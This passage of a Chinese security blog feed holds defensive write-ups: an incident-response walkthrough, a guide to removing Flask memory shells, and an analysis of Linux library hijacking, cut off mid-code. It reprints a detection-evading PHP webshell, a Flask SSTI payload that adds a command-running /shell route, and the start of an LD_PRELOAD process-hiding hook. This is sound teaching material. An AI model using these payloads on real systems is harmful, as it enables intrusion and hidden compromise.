alt="image-20221023224735853"></p><p>聊天记录在session表里面</p><p><img src="http://cdn.polowong.top/image-20221023224927122.png" alt="image-20221023224927122"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一道不错的取证题目，主要考察微信聊天记录解密&lt;/p&gt;
&lt;h1 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h1&gt;&lt;p&gt;巅峰极客2022-Misc-easy_Forensic&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="forensic" scheme="https://polosec.github.io/tags/forensic/"/>
    
    <category term="meiyacup" scheme="https://polosec.github.io/tags/meiyacup/"/>
    
  </entry>
  
  <entry>
    <title>BUGKU PAR 应急加固</title>
    <link href="https://polosec.github.io/2022/10/16/BUGKU-PAR-%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/"/>
    <id>https://polosec.github.io/2022/10/16/BUGKU-PAR-%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/</id>
    <published>2022-10-16T12:30:17.000Z</published>
    <updated>2022-10-17T02:49:46.663Z</updated>
    
    <content type="html"><![CDATA[<h1 id="js劫持"><a href="#js劫持" class="headerlink" title="js劫持"></a>js劫持</h1><p>点开之后发现有个URL跳转，跳转到了博客，所以劫持后的URL是</p><p><a href="https://www.194nb.com/">https://www.194nb.com</a></p><h1 id="首次webshell"><a href="#首次webshell" class="headerlink" title="首次webshell"></a>首次webshell</h1><p>ssh上去直接看/var/www/html目录，找类似Upload的文件夹</p><p>直接找到webshell</p><p><img src="http://cdn.polowong.top/image-20221016203611008.png" alt="image-20221016203611008"></p><h1 id="首次攻击方式"><a href="#首次攻击方式" class="headerlink" title="首次攻击方式"></a>首次攻击方式</h1><p>使用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log |cut -d &quot; &quot; -f 1 |sort |uniq -c |sort -nr |head -n 10</span><br></pre></td></tr></table></figure><p>获得访问前10的ip地址（nginx）</p><p>apache如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat access_log|awk &#x27;&#123;print $1&#125;&#x27;|sort|uniq-c|sort -nr|head -10</span><br><span class="line"></span><br><span class="line">注意awk &#x27;&#123;print$1&#x27;，它表示取日志的第一段，如果换成别的日志，其IP地址在第3段那么就要改变相应数值。</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20221016204107813.png" alt="image-20221016204107813"></p><p>IP地址<strong>123.139.39.161</strong>明显异常，利用工具查看其动作</p><p>利用日志分析工具</p><p><a href="https://security.tencent.com/index.php/opensource/detail/15">https://security.tencent.com/index.php/opensource/detail/15</a></p><p>scp上传服务器</p><p><img src="http://cdn.polowong.top/image-20221016203755232.png" alt="image-20221016203755232"></p><p><img src="http://cdn.polowong.top/image-20221016204801960.png" alt="image-20221016204801960"></p><p>可以看到某个ip地址访问的URL，但是从这里没有看出异常，除了1.php。</p><p>先手动看一下nginx日志，grep上述地址</p><p><img src="http://cdn.polowong.top/image-20221016205048627.png" alt="image-20221016205048627"></p><p><img src="http://cdn.polowong.top/image-20221016205115428.png" alt="image-20221016205115428"></p><p><img src="http://cdn.polowong.top/image-20221016205141009.png" alt="image-20221016205141009"></p><p>可以看到/sale/api这里有一个xss的payload，交一下试试,小写xss正确</p><h1 id="黑客服务器信息"><a href="#黑客服务器信息" class="headerlink" title="黑客服务器信息"></a>黑客服务器信息</h1><p>看下进程和端口</p><p><img src="http://cdn.polowong.top/image-20221016205734324.png" alt="image-20221016205734324"></p><p>lsof看到80端口有/dev/null字样，可能有异常，但是不能确定是什么问题</p><p>ps aux 看到有运行的脚本文件</p><p><img src="http://cdn.polowong.top/image-20221016205836669.png" alt="image-20221016205836669"></p><p>一个反弹shell</p><p><img src="http://cdn.polowong.top/image-20221016205932244.png" alt="image-20221016205932244"></p><p>ip地址49.232.241.253:8888</p><h1 id="黑客webshell2"><a href="#黑客webshell2" class="headerlink" title="黑客webshell2"></a>黑客webshell2</h1><p>刚才logforensics找到的1.php看一眼</p><p><img src="http://cdn.polowong.top/image-20221016210200093.png" alt="image-20221016210200093"></p><p><img src="http://cdn.polowong.top/image-20221016210223004.png" alt="image-20221016210223004"></p><p>这个文件用D盾和河马是杀不出来的，所以免杀马++</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$aa</span>=_GET;@array_map(implode(<span class="string">&#x27;&#x27;</span>,[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;t&#x27;</span>]),<span class="variable">$$aa</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h1><p>mysql&gt; revoke file on <em>.</em> from ‘root’@’localhost’;</p><p>mysql&gt; set global general_log=’off’;</p><p>flush privileges;</p><p>mysql更新密码：mysql&gt; set password for root@localhost =password(‘12345678’)</p><p>mysql备份数据库</p><p>mysqldump -u root -p12345678  –all-databases &gt;1.sql</p><p>mysql还原数据库</p><p>mysql -u root -p  &lt;1.sql</p><h1 id="黑客账号"><a href="#黑客账号" class="headerlink" title="黑客账号"></a>黑客账号</h1><p>cat /etc/passwd</p><p>cat /etc/shadow </p><p>发现账号aman并且删除</p><p><img src="http://cdn.polowong.top/image-20221016211345910.png" alt="image-20221016211345910"></p><h1 id="黑客篡改命令1和2"><a href="#黑客篡改命令1和2" class="headerlink" title="黑客篡改命令1和2"></a>黑客篡改命令1和2</h1><p>看一下bin目录的ls</p><p>有个ls和ls2，file一下</p><p><img src="http://cdn.polowong.top/image-20221016212123565.png" alt="image-20221016212123565"></p><p>ls有问题</p><p>修复一下</p><p><img src="http://cdn.polowong.top/image-20221016212247780.png" alt="image-20221016212247780"></p><p>发现ps也有问题</p><p><img src="http://cdn.polowong.top/image-20221016212311673.png" alt="image-20221016212311673"></p><p>一样地，ps隐藏了某个进程</p><p><img src="http://cdn.polowong.top/image-20221016212346361.png" alt="image-20221016212346361"></p><p>rm -rf ps </p><p>mv ps_ ps</p><h1 id="JS劫持修复"><a href="#JS劫持修复" class="headerlink" title="JS劫持修复"></a>JS劫持修复</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | xargs grep -ri &#x27;&quot;text/javascript&quot;&gt;&#x27; -l | sort | uniq -c</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20221016213127890.png" alt="image-20221016213127890"></p><p><img src="http://cdn.polowong.top/image-20221016213229871.png" alt="image-20221016213229871"></p><p>把最后一个script标签删掉就好了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;js劫持&quot;&gt;&lt;a href=&quot;#js劫持&quot; class=&quot;headerlink&quot; title=&quot;js劫持&quot;&gt;&lt;/a&gt;js劫持&lt;/h1&gt;&lt;p&gt;点开之后发现有个URL跳转，跳转到了博客，所以劫持后的URL是&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.19</summary>
      
    
    
    
    
    <category term="rdg" scheme="https://polosec.github.io/tags/rdg/"/>
    
  </entry>
  
  <entry>
    <title>Flask内存马的检测与清除</title>
    <link href="https://polosec.github.io/2022/10/16/Flask%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E6%A3%80%E6%B5%8B%E4%B8%8E%E6%B8%85%E9%99%A4/"/>
    <id>https://polosec.github.io/2022/10/16/Flask%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E6%A3%80%E6%B5%8B%E4%B8%8E%E6%B8%85%E9%99%A4/</id>
    <published>2022-10-15T16:59:21.000Z</published>
    <updated>2022-10-15T16:59:56.482Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string,current_app</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span>  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    person = <span class="string">&#x27;knave&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&lt;h1&gt;Hi, %s.&lt;/h1&gt;&#x27;</span> % person</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><h1 id="Flask-内存马生成"><a href="#Flask-内存马生成" class="headerlink" title="Flask 内存马生成"></a>Flask 内存马生成</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;app.add_url_rule(&#39;&#x2F;shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read())&quot;,&#123;&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&#125;)</span><br></pre></td></tr></table></figure><h1 id="Flask内存马检测"><a href="#Flask内存马检测" class="headerlink" title="Flask内存马检测"></a>Flask内存马检测</h1><h2 id="情景1-代码自带内存马"><a href="#情景1-代码自带内存马" class="headerlink" title="情景1 代码自带内存马"></a>情景1 代码自带内存马</h2><p><img src="http://cdn.polowong.top/image-20221016005717629.png" alt="image-20221016005717629"></p><p>类似于这种直接执行命令的，再复杂一点的base64编码之类的，看到之后直接清除掉即可。</p><h2 id="情景2-通过ssti种植内存马"><a href="#情景2-通过ssti种植内存马" class="headerlink" title="情景2 通过ssti种植内存马"></a>情景2 通过ssti种植内存马</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].url_map</span><br><span class="line">打印当前所有路由，可用来结合流量观察是否有内存马</span><br></pre></td></tr></table></figure><p>rule的意思是通过URL访问的地址，如/shell，后面-&gt;跟的是entrypoint，可以理解为处理到达该请求的函数是什么，比如rule ‘/‘的entrypoint是hello_world,那么当访问首页的时候就会转到函数hello_world去进行处理。</p><p><img src="http://cdn.polowong.top/image-20221016001751973.png" alt="image-20221016001751973"></p><h1 id="flask内存马清除"><a href="#flask内存马清除" class="headerlink" title="flask内存马清除"></a>flask内存马清除</h1><p>修改源代码，新建一个同名路由（如/shell），即可抵消新写入路由的影响，并且修复ssti，只需要过滤花括号就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string,current_app</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span>  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    person = <span class="string">&#x27;knave&#x27;</span></span><br><span class="line">    blacklist=<span class="string">&#x27;&#123;&#x27;</span><span class="comment">#彻底杜绝ssti</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> blacklist <span class="keyword">in</span> person:<span class="comment">#关键字检测</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;fxxk hacker&quot;</span></span><br><span class="line">    template = <span class="string">&#x27;&lt;h1&gt;Hi, %s.&lt;/h1&gt;&#x27;</span> % person</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shell&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;123&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>再次使用payload打一下，情况如下</p><p><img src="http://cdn.polowong.top/image-20221016005113292.png" alt="image-20221016005113292"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/10933#toc-4">https://xz.aliyun.com/t/10933#toc-4</a></p><p><a href="https://www.anquanke.com/post/id/279160#h3-11">https://www.anquanke.com/post/id/279160#h3-11</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Demo&quot;&gt;&lt;a href=&quot;#Demo&quot; class=&quot;headerlink&quot; title=&quot;Demo&quot;&gt;&lt;/a&gt;Demo&lt;/h1&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;p</summary>
      
    
    
    
    
    <category term="rdg" scheme="https://polosec.github.io/tags/rdg/"/>
    
    <category term="awd" scheme="https://polosec.github.io/tags/awd/"/>
    
  </entry>
  
  <entry>
    <title>实景防御赛Linux库文件劫持技术浅析</title>
    <link href="https://polosec.github.io/2022/10/10/%E5%AE%9E%E6%99%AF%E9%98%B2%E5%BE%A1%E8%B5%9BLinux%E5%BA%93%E6%96%87%E4%BB%B6%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E6%B5%85%E6%9E%90/"/>
    <id>https://polosec.github.io/2022/10/10/%E5%AE%9E%E6%99%AF%E9%98%B2%E5%BE%A1%E8%B5%9BLinux%E5%BA%93%E6%96%87%E4%BB%B6%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E6%B5%85%E6%9E%90/</id>
    <published>2022-10-10T14:24:44.000Z</published>
    <updated>2022-10-12T04:35:07.438Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>很久没写博客了，感觉已经摆烂了很久，所以今天下定决心要把之前遇到的一个点解决掉。</p><p>去年打广东省强网杯决赛的时候上午算是安全运维赛，遇到了一道题，和Linux库文件劫持有关，于是趁此机会把这个点讲清楚，也算是问了后面网鼎杯半决赛的RDG（实景防御）复习开个好头。</p><h1 id="Linux库文件"><a href="#Linux库文件" class="headerlink" title="Linux库文件"></a>Linux库文件</h1><p>在讲库文件劫持之前需要了解Linux的库文件到底是什么。Linux的库文件分为动态库和静态库。</p><p>对于静态库文件来说，所有代码在编译的时候就会被加载，因此可执行程序体积较大。</p><p>本次主要讨论动态库，在编译时引入动态库(so)并不会将动态库中的代码编译到可执行程序中，而是在可执行程序中记录了对so文件的引用，当执行时，才会去加载so文件，以节省内存空间。</p><h2 id="动态库文件加载顺序"><a href="#动态库文件加载顺序" class="headerlink" title="动态库文件加载顺序"></a>动态库文件加载顺序</h2><ol><li><p>gcc 编译时指定的运行时库路径 -Wl,-rpath</p></li><li><p>环境变量 LD_LIBRARY_PATH</p></li><li><p>ldconfig 缓存 /etc/ld.so.cache</p></li><li><p>系统默认库位置 /lib   /usr/lib</p></li></ol><h2 id="第一个Linux动态库demo"><a href="#第一个Linux动态库demo" class="headerlink" title="第一个Linux动态库demo"></a>第一个Linux动态库demo</h2><p>为了模拟赛时场景，需要写一个so文件并且调用，先写一个最简单的demo，后面再将赛时场景加入。</p><p>当前有三个文件，分别是main.c add.c add.h</p><p>内容分别如下</p><p>main.c:</p><p><img src="http://cdn.polowong.top/image-20221010224805161.png" alt="image-20221010224805161"></p><p>add.c:</p><p><img src="http://cdn.polowong.top/image-20221010224824880.png" alt="image-20221010224824880"></p><p>Add.h:</p><p><img src="http://cdn.polowong.top/image-20221010224840262.png" alt="image-20221010224840262"></p><p>add.c中定义了方法adds，返回a+b的值，add.h中给出了方法adds的声明</p><p>main.c中调用了adds方法并且输出值</p><h3 id="生成so文件"><a href="#生成so文件" class="headerlink" title="生成so文件"></a>生成so文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc add.c -fPIC -shared -o libadd.so</span><br></pre></td></tr></table></figure><p>-fPIC是编译选项，PIC是 Position Independent Code 的缩写，表示要生成位置无关的代码，这是动态库需要的特性； -shared是链接选项，告诉gcc生成动态库而不是可执行文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc main.c -L. -ladd -o main</span><br></pre></td></tr></table></figure><p>-ladd表示链接<strong>libadd.so</strong>文件</p><p>-L.表示搜索要链接的库文件时包含当前路径。</p><p>注意，如果同一目录下同时存在同名的动态库和静态库，比如 libadd.so 和 libadd.a 都在当前路径下， 则gcc会优先链接动态库。</p><p>最后生成的为main可执行文件</p><p>直接执行会报错，提示</p><p> ./main: error while loading shared libraries: libadd.so: cannot open shared object file: No such file or directory  </p><p>出现这个错误的原因是没有找到libadd.so文件，原来Linux是通过 /etc/ld.so.cache 文件搜寻要链接的动态库的。 而 /etc/ld.so.cache 是 ldconfig 程序读取 /etc/ld.so.conf 文件生成的。</p><p>所以，需要修改/etc/ld.so.conf文件内容，添加so文件的路径，并且使用ldconfig命令更新。</p><p><img src="http://cdn.polowong.top/image-20221010225826208.png" alt="image-20221010225826208"></p><h2 id="ldd与nm命令"><a href="#ldd与nm命令" class="headerlink" title="ldd与nm命令"></a>ldd与nm命令</h2><p><strong>ldd</strong>命令可以查看一个可执行程序依赖的共享库,比如刚才写的libadd.so</p><p><img src="http://cdn.polowong.top/image-20221010230125471.png" alt="image-20221010230125471"></p><p><strong>nm</strong>命令</p><p>查看一个库中到底有哪些函数，<strong>nm</strong>命令可以打印出库中的涉及到的所有符号。</p><p><img src="http://cdn.polowong.top/image-20221010230329912.png" alt="image-20221010230329912"></p><h2 id="strace命令"><a href="#strace命令" class="headerlink" title="strace命令"></a>strace命令</h2><p>strace命令用于跟踪系统调用，常用命令如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -o output.txt -T -tt -e trace&#x3D;all -p 28979</span><br></pre></td></tr></table></figure><p>上面的含义是 跟踪28979进程的所有系统调用（-e trace=all），并统计系统调用的花费时间，以及开始时间（并以可视化的时分秒格式显示），最后将记录结果存在output.txt文件里面。</p><p>通过strace可以看到调用了哪些动态链接库，例如下面给出的whoami的例子（后面一张图是截的别人的，自己的好像没有看到那么多库）</p><p><img src="http://cdn.polowong.top/image-20221010231322097.png" alt="image-20221010231322097"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace /usr/bin/whoami</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20221010231442938.png" alt="image-20221010231442938"></p><h1 id="挖矿场景下的动态库劫持分析"><a href="#挖矿场景下的动态库劫持分析" class="headerlink" title="挖矿场景下的动态库劫持分析"></a>挖矿场景下的动态库劫持分析</h1><p>在处理过的挖矿事件中，挖矿程序通常会隐藏真实的挖矿进程，导致通过ps top等命令无法看到挖矿进程。</p><p>写一个类似的demo去模拟该场景,我自己服务器性能太差了 跑不动，就把socket连接换成了print ok</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_traffic</span>(<span class="params">ip, port</span>):</span></span><br><span class="line">     <span class="built_in">print</span> <span class="string">&quot;Sending burst to &quot;</span> + ip + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(port)</span><br><span class="line">     <span class="comment">#sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span></span><br><span class="line">     <span class="comment">#sock.connect((ip, port))</span></span><br><span class="line">     <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># sock.send(&quot;I AM A BAD BOY&quot;) </span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ok&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">     <span class="built_in">print</span> <span class="string">&quot;Usage: &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; IP PORT&quot;</span></span><br><span class="line">     sys.exit() </span><br><span class="line"></span><br><span class="line">send_traffic(sys.argv[<span class="number">1</span>], <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])) Let’s go! </span><br></pre></td></tr></table></figure><p>python2 evil.py 1.1.1.1 8888</p><p>运行之后使用top命令和ps aux 可以看到所运行的进程</p><p><img src="http://cdn.polowong.top/image-20221012102734594.png" alt="image-20221012102734594"></p><p><img src="http://cdn.polowong.top/image-20221012102751965.png" alt="image-20221012102751965"></p><p>接下来挖矿程序的目的是隐藏该CPU/内存占用率过高的进程。</p><p>简单地说，ps命令是通过遍历/proc目录获取与进程相关的信息（pid status cmdline等）</p><h2 id="进程隐藏方法"><a href="#进程隐藏方法" class="headerlink" title="进程隐藏方法"></a>进程隐藏方法</h2><h3 id="alias命令"><a href="#alias命令" class="headerlink" title="alias命令"></a>alias命令</h3><p>alias ‘ps’=’ps aux | grep -v python’</p><p>这里的python可以换成任意目标字符串或者获取到的pid</p><h3 id="替换二进制文件"><a href="#替换二进制文件" class="headerlink" title="替换二进制文件"></a>替换二进制文件</h3><p>默认ps的链接文件为</p><p><img src="http://cdn.polowong.top/image-20221012103737290.png" alt="image-20221012103737290"></p><p>可以通过替换ps命令或者新建连接实现二进制文件替换/修改，如将ps删除，新上传一个恶意的ps，实现进程隐藏。</p><h3 id="预加载-preloading"><a href="#预加载-preloading" class="headerlink" title="预加载(preloading)"></a>预加载(preloading)</h3><p>通过预加载，Linux给了我们一个选项，在其他正常的系统库被加载之前加载一个自定义共享库。这意味着，如果自定义库导出的函数与系统库中的函数名相同，我们就可以用我们库中的自定义代码覆盖它，而所有的进程都会自动选择我们的自定义函数)</p><p>例如，通过重写readdir()方法，在去去读/proc目录的时候，刻意隐藏某个进程。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Every process with this name will be excluded</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span>* process_to_filter = <span class="string">&quot;evil.py&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a directory name given a DIR* handle</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">get_dir_name</span><span class="params">(DIR* dirp, <span class="keyword">char</span>* buf, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">dirfd</span>(dirp);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> tmp[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(tmp, <span class="built_in"><span class="keyword">sizeof</span></span>(tmp), <span class="string">&quot;/proc/self/fd/%d&quot;</span>, fd);</span><br><span class="line">    <span class="keyword">ssize_t</span> ret = <span class="built_in">readlink</span>(tmp, buf, size);</span><br><span class="line">    <span class="keyword">if</span>(ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buf[ret] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a process name given its pid</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">get_process_name</span><span class="params">(<span class="keyword">char</span>* pid, <span class="keyword">char</span>* buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span 